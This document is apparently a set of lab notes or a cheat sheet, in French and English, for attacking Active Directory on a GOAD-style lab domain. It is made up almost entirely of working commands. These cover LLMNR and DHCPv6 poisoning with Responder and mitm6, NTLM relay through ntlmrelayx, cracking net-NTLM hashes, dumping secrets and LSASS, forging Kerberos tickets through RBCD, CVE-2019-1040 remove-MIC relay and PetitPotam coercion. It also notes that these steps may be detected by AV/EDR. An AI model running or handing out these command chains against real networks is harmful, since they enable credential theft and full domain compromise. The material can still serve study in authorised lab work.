# Poison and Relay

## Responder

Répondre aux requêtes LLMNR et NETBIOS pour récupérer les hash net-ntlm

```
responder -I eth1
```

Voir les logs de Responder

```bash
ls -l /usr/share/responder/logs/
```

If you want to delete the previous captured logs (message skipped previously captured hash) delete the file `/usr/share/responder/Responder.db`

create a file responder.hashes with the two hashes found, and crack them

```bash
hashcat -m5600 --force -a 0 responder.hashes /usr/share/wordlists/rockyou.txt 
```

## NTLM Relay

Générer une liste de cibles avec SMB signing : false

```bash
nxc smb 192.168.56.10-23 --gen-relay-list relay.txt
```

Stop the responder smb and http server as we don’t want to get the hashes directly but we want to relay them to ntlmrelayx -> /usr/share/responder/Responder.conf

```bash
sed -i 's/HTTP = On/HTTP = Off/g' /usr/share/responder/Responder.conf
sed -i 's/SMB = On/SMB = Off/g' /usr/share/responder/Responder.conf
```

Démarrer Responder pour empoisonner les réponses aux requêtes et les rediriger vers NTLMrelayx qui va host un proxy socks que l'on utilisera par la suite pour réaliser des actions sur les devices sur lesquels une sessions est ouverte.

```bash
impacket-ntlmrelayx -tf relay.txt -of netntlm -smb2support -socks
sudo responder -I eth1
```

Maintenant on va effectuer des actions à travers le proxy socks hébergé par ntlmrelayx qui maintient la connexion ouverte relayée.

#### Dump secrets

```bash
# ! POSSIBLE DETECTION ET BLOCAGE AV/EDR !
proxychains impacket-secretsdump -no-pass 'NORTH'/'EDDARD.STARK'@'192.168.56.22'
proxychains lsassy --no-pass -d NORTH -u EDDARD.STARK 192.168.56.22
```

#### SMB

```
proxychains impacket-smbclient -no-pass 'NORTH'/'EDDARD.STARK'@'192.168.56.22' -debug
proxychains impacket-smbexec -no-pass 'NORTH'/'EDDARD.STARK'@'192.168.56.22' -debug
```

## Mitm6

If IPv6 is not disabled on user machines, it is possible to abuse requests (DHCPv6) to set up a corrupt DNS (our machine) as a name resolution server to resolve IPv6 names to get into a MiTM position.

Empoisonne les requêtes DHCPv6 sur le réseau pour se mettre en position de DNS.

```bash
mitm6 -i eth1 -d essos.local -d sevenkingdoms.local -d north.sevenkingdoms.local --debug
```

Relaye l'authentification NTLM interceptée vers LDAPS pour créer un compte machine avec délégation RBCD.

```bash
ntlmrelayx.py -6 -wh wpadfakeserver.essos.local -t ldaps://meereen.essos.local --delegate-access
```

Forge un ticket Kerberos pour un utilisateur ciblé via S4U2Proxy en exploitant une délégation RBCD.

```bash
impacket-getST -spn HOST/BRAAVOS.ESSOS.LOCAL -impersonate Administrator -dc-ip 192.168.56.12 'ESSOS.LOCAL/relayedpccreate$:ttrJB6qsD;B3BSn'
```

Use that ticket to retreive secrets on BRAAVOS

```bash
export KRB5CCNAME=/workspace/Administrator.ccache
secretsdump -k -no-pass ESSOS.LOCAL/'Administrator'@braavos.essos.local
nxc smb 192.168.56.23 -k --use-kcache --sam
```

If we specify a loot dir all the informations on the ldap are automatically dumped

```
ntlmrelayx.py -6 -wh wpadfakeserver.essos.local -t ldaps://meereen.essos.local -l /workspace/loot
```

## Drop the mic

#### **CVE-2019-1040 – "Drop The MIC" (a.k.a. "Remove MIC")**

> Une vulnérabilité dans NTLM qui permet de relayer une authentification SMB vers LDAPS **en supprimant le MIC (Message Integrity Code)**, ce qui normalement est censé empêcher ce type de relai.

Start the relay with remove mic to the ldaps of meereen.essos.local.

```bash
ntlmrelayx -t ldaps://meereen.essos.local -smb2support --remove-mic --delegate-access
```

Run the coerce authentication on braavos (braavos is a windows server 2016 up to date so petitpotam unauthenticated will not work here)

```bash
python3 PetitPotam.py -u khal.drogo -p horse 192.168.56.129 braavos.essos.local
```

The attack worked we can now exploit braavos with RBCD

```bash
impacket-getST -spn HOST/BRAAVOS.ESSOS.LOCAL -impersonate Administrator -dc-ip 192.168.56.12 'ESSOS.LOCAL/AUTBHVFM$:uvEGGJ+$7g3}Bb*'
```

Use that ticket to retreive secrets on BRAAVOS

```bash
export KRB5CCNAME=/workspace/Administrator.ccache
secretsdump -k -no-pass ESSOS.LOCAL/'Administrator'@braavos.essos.local
nxc smb 192.168.56.23 -k --use-kcache --sam
```
